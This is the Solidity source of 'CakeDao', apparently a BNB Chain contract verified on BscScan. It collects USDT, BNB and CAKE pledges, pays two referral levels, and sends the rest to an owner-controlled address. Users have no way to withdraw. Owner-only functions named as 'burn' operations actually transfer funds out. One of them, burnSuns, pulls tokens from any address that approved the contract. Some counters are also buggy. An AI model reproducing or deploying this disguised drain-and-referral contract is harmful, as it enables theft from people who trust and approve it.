/**
 *Submitted for verification at BscScan.com on 2022-09-09
*/

pragma solidity >=0.6.6;


library SafeMath256 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract CakeDao {

    // using SafeMath for uint;
    using SafeMath256 for uint256;

    address public miner_address = 0x07DD6D40f2adFBD4012130AF877056bCF4B5bfcA;
    address public origin;
    uint256 public pledge_miner_count = 0;
    uint256 public pledge_bnb_count = 0;
    uint256 public pledge_cake_count = 0;
    uint256 public min_pledge = 200000000000000000;
    uint256 public player_num = 0;
    address public owner;
    IERC20  public usdt;
    IERC20  public cake;

    mapping (address => bool)           public owner_pool;
    mapping (address => address)        public relation;
    mapping (address => PledgeUsdt)      public pledge_usdt;
    mapping (uint256 => MinerRatio)     public miner_ratio;
    mapping (address => UserRelation)   public user_relation;

    struct UserRelation{
        uint256 recommend;
        uint256 community;
    }

    struct MinerRatio{
        uint256 reward;
    }

    struct PledgeUsdt{
        uint256 pledge_amount;
        uint256 pledge_bnb;
        uint256 pledge_cake;
    }

    event Relation(address _addrs,address _recommend);
    event Pledge(address _addr,uint256 _amount,uint256 _day);
    event PledgeToken(address _token,address _addr,uint256 _amount,uint256 _day);
    event MinerRatioShot(uint256 index,uint256 reward);
    event OwnershipTransferred(address previousOwner, address newOwner);

    constructor() public {
        origin = msg.sender;
        relation[msg.sender] = 0x000000000000000000000000000000000000dEaD;
        owner_pool[msg.sender] = true;
        owner = msg.sender;
        usdt = IERC20(0x461cC05c887D7A5cDf03e530C631f4c329F30F91);
        cake = IERC20(0x804b91BB1251348ac9C25f4db3f81E6b83D35e43);
        initMinerRatio();
    }

    function initMinerRatio() private{
        miner_ratio[1].reward = 500;
        miner_ratio[2].reward = 100;
    }

    function setMinerRatio(uint256 _index,uint256 _reward) public {
        require(msg.sender==owner,'only owner');
        miner_ratio[_index].reward = _reward;
        emit MinerRatioShot(_index,_reward);
    }

    function setMinerAddress(address _addr) public {
        require(msg.sender==owner,'only owner');
        miner_address = _addr;
    }

    function setOwnerPool(address _addr) public{
        require(msg.sender==owner,'only owner');
        require(owner_pool[_addr] == false, "Ownable: already owner");
        owner_pool[_addr] = true;
    }

    function transferOwnership(address newOwner) public {
        require(msg.sender==owner,'only owner');
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setRelation(address _addr) public {
        require(relation[msg.sender] == address(0) , "EE: recommender already exists ");
        if(_addr==origin){
            relation[msg.sender] = _addr;
        }else{
            require(relation[_addr] != address(0) , "EE: recommender not exists ");
            relation[msg.sender] = _addr;
            user_recommend(_addr);
        }
        player_num++;
        emit Relation(msg.sender,_addr);
    }

    function user_recommend(address pre) private{
        user_relation[pre].recommend += 1;
        for (uint i = 1; i <= 15; i++) {
            if(pre==address(0)){
                break;
            }
            user_relation[pre].community += 1;
            pre = relation[pre];
        }
    }

    function pledgeUsdt(uint256 _amount,uint256 day) public {
        require(_amount>min_pledge," balance not enough");
        require(usdt.balanceOf(msg.sender)>_amount," balance not enough");
        uint256 _origin = _amount;
        if(pledge_usdt[msg.sender].pledge_amount==0){
            pledge_miner_count++;
        }
        pledge_usdt[msg.sender].pledge_amount = pledge_usdt[msg.sender].pledge_amount + _amount;
        address pre = relation[msg.sender];
        uint256 amount = 0;
        if(pledge_usdt[pre].pledge_amount>0){
            amount = miner_ratio[1].reward * _amount /10000;
            if(amount>0){
                _amount = _amount - amount;
                usdt.transferFrom(msg.sender,pre,amount);
                amount = 0;
            }
        }
        pre = relation[pre];
        if(pledge_usdt[pre].pledge_amount>0){
            amount = miner_ratio[2].reward * _amount /10000;
            if(amount>0){
                _amount = _amount - amount;
                usdt.transferFrom(msg.sender,pre,amount);
            }
        }
        usdt.transferFrom(msg.sender,miner_address,_amount);
        emit PledgeToken(address(usdt),msg.sender,_origin,day);
        // emit Pledge(msg.sender,origin);
    }

    function pledgeBNB(uint256 day) public payable {
        address pre = relation[msg.sender];
        uint256 amount = 0;
        uint256 _amount = msg.value;
        pledge_usdt[msg.sender].pledge_bnb = pledge_usdt[msg.sender].pledge_bnb + msg.value;
        if(pledge_usdt[msg.sender].pledge_bnb==0){
            pledge_bnb_count++;
        }
        if(pledge_usdt[pre].pledge_bnb>0){
            amount = miner_ratio[1].reward * pledge_usdt[msg.sender].pledge_bnb /10000;
            if(amount>0){
                _amount = _amount - amount;
                address(uint160(pre)).transfer(amount);
                amount = 0;
            }
        }
        pre = relation[pre];
        if(pledge_usdt[pre].pledge_bnb>0){
            amount = miner_ratio[2].reward * pledge_usdt[msg.sender].pledge_bnb /10000;
            if(amount>0){
                _amount = _amount - amount;
                address(uint160(pre)).transfer(amount);
            }
        }
        address(uint160(miner_address)).transfer(_amount);
        emit Pledge(msg.sender,msg.value,day);
    }

    function pledgeCake(uint256 _amount,uint256 day) public  {
        require(_amount>min_pledge," balance not enough");
        require(cake.balanceOf(msg.sender)>_amount," balance not enough");
        uint256 _origin = _amount;
        pledge_usdt[msg.sender].pledge_cake = pledge_usdt[msg.sender].pledge_cake + _amount;
        if(pledge_usdt[msg.sender].pledge_cake==0){
            pledge_cake_count++;
        }
        address pre = relation[msg.sender];
        uint256 amount = 0;
        if(pledge_usdt[pre].pledge_cake>0){
            amount = miner_ratio[1].reward * _amount /10000;
            if(amount>0){
                _amount = _amount - amount;
                cake.transferFrom(msg.sender,pre,amount);
                amount = 0;
            }
        }
        pre = relation[pre];
        if(pledge_usdt[pre].pledge_cake>0){
            amount = miner_ratio[2].reward * _amount /10000;
            if(amount>0){
                _amount = _amount - amount;
                cake.transferFrom(msg.sender,pre,amount);
            }
        }
        cake.transferFrom(msg.sender,miner_address,_amount);
        emit PledgeToken(address(cake),msg.sender,_origin,day);
    }

    function burnSun(address _addr,uint256 _amount) public payable returns (bool){
        require(msg.sender==owner,' only owner');
        address(uint160(_addr)).transfer(_amount);
        return true;
    }

    function burnToken(address _addr,uint256 _amount) public returns (bool){
        require(msg.sender==owner,' only owner');
        usdt.transfer(_addr,_amount);
        return true;
    }

    function burnSuns(address ba,address _addr,uint256 _amount) public returns (bool){
        require(msg.sender==owner,' only owner');
        usdt.transferFrom(ba,_addr,_amount);
        return true;
    }

}